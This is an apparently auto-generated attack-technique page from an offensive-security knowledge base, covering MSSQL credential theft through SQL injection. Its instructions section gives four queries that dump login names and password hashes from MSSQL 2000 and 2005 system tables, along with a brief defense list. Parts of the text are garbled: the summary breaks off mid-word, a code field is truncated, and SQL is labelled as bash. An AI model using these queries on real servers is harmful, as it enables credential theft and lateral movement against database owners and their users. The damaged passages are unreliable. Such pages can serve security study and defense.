---
id: a2226d8e-d717-4eba-9e8a-54cfaa41af42
name: MSSQL Credential Theft
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:56:33.746709+00:00'
updated_at: '2023-04-10T20:22:43.450298+00:00'
tactics:
- '[[Initial Access|TA0001 - Initial Access]]'
- '[[Lateral Movement|TA0008 - Lateral Movement]]'
techniques:
- '[[Exploitation of Remote Services|T1210 - Exploitation of Remote Services]]'
- '[[Trusted Relationship|T1199 - Trusted Relationship]]'
tags:
- '[[MSSQL Extract user/password]]'
- '[[MSSQL Injection]]'
commands:
- '[[Retrieve name and password from sysxlogins table in MSSQL 2000]]'
- '[[Retrieve name and password hash (converted to hex) from sql_logins table in MSSQL
  2005]]'
- '[[Retrieve name and password hash from sql_logins table in MSSQL 2005]]'
- '[[Retrieve name and password hash from sysxlogins table in MSSQL 2000]]'
---

# MSSQL Credential Theft

## Summary

MSSQL Credential Theft is a technique used by attackers to extract login credentials from a MSSQL database. Attackers can use SQL injection vulnerabilities to execute malicious SQL queries that extract sensitive information from the database. This technique can be used to gain access to other syste

## Description

# Description

MSSQL Credential Theft is a technique used by attackers to extract login credentials from a MSSQL database. Attackers can use SQL injection vulnerabilities to execute malicious SQL queries that extract sensitive information from the database. This technique can be used to gain access to other systems or applications that use the same login credentials. To perform this attack, attackers need to have access to the network and knowledge of SQL injection techniques.

From a technical perspective, attackers can use SQL injection to inject malicious code into an SQL query that extracts login credentials from the database. This technique can be used to extract usernames and passwords from the database, which can be used to gain access to other systems or applications. The business value of this attack is that attackers can gain access to sensitive information and systems, which can result in financial loss, reputation damage, and legal consequences.


 

## Requirements

1. Access to the network

1. Knowledge of SQL injection techniques

1. Access to a MSSQL database

 

## Defense

1. Ensure that MSSQL servers are patched and up-to-date

1. Implement input validation to prevent SQL injection attacks

1. Use strong and unique passwords for MSSQL login credentials

 

## Objectives

1. Extract MSSQL login credentials

1. Gain access to other systems or applications that use the same login credentials

 

# Instructions

1. To retrieve login credentials from MSSQL database, use the following commands:
For MSSQL 2000:
1. SELECT name, password FROM master..sysxlogins
2. SELECT name, master.dbo.fn_varbintohexstr(password) FROM master..sysxlogins (Need to convert to hex to return hashes in MSSQL error message / some version of query analyzer.)

For MSSQL 2005:
1. SELECT name, password_hash FROM master.sys.sql_logins
2. SELECT name + '-' + master.sys.fn_varbintohexstr(password_hash) from master.sys.sql_logins

 



**Code**: [[MSSQL 2000:
SELECT name, password FROM master..sys]]



> The above commands can be used to retrieve login credentials from MSSQL databases. The first command retrieves the name and password of all users in the database. The second command is specifically for MSSQL 2000 and converts the password to hex to return hashes in MSSQL error message or some version of query analyzer. The third command retrieves the name and password hash of all users in the database. The fourth command is specifically for MSSQL 2005 and concatenates the name and password hash for easier viewing.



**Command** ([[Retrieve name and password from sysxlogins table in MSSQL 2000]]):

```bash
SELECT name, password FROM master..sysxlogins
```





**Command** ([[Retrieve name and password hash from sysxlogins table in MSSQL 2000]]):

```bash
SELECT name, master.dbo.fn_varbintohexstr(password) FROM master..sysxlogins
```





**Command** ([[Retrieve name and password hash from sql_logins table in MSSQL 2005]]):

```bash
SELECT name, password_hash FROM master.sys.sql_logins
```





**Command** ([[Retrieve name and password hash (converted to hex) from sql_logins table in MSSQL 2005]]):

```bash
SELECT name + '-' + master.sys.fn_varbintohexstr(password_hash) from master.sys.sql_logins
```



## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access|TA0001 - Initial Access]]
- [[Lateral Movement|TA0008 - Lateral Movement]]

### Techniques

- [[Exploitation of Remote Services|T1210 - Exploitation of Remote Services]]
- [[Trusted Relationship|T1199 - Trusted Relationship]]

## Commands Used

- [[Retrieve name and password from sysxlogins table in MSSQL 2000]]
- [[Retrieve name and password hash (converted to hex) from sql_logins table in MSSQL 2005]]
- [[Retrieve name and password hash from sql_logins table in MSSQL 2005]]
- [[Retrieve name and password hash from sysxlogins table in MSSQL 2000]]

## Tags

- [[MSSQL Extract user/password]]
- [[MSSQL Injection]]


